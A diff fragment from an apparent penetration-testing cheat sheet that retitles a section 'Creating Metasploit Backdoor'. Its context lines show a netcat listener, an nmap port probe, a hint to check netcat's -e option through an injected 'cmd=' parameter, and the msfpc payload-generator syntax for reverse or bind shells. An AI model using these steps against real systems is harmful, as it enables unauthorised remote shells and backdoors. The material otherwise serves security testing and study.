@@ -20,7 +20,7 @@ Try `cmd=nc -h` to check whether `-e` option is available.
 `nmap -p 1234 192.168.100.2`  
 `nc -vv -lp 1234`
 
-## Meterpreter / Payload flow
+## Creating Metasploit Backdoor
 ```
 msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
 ```
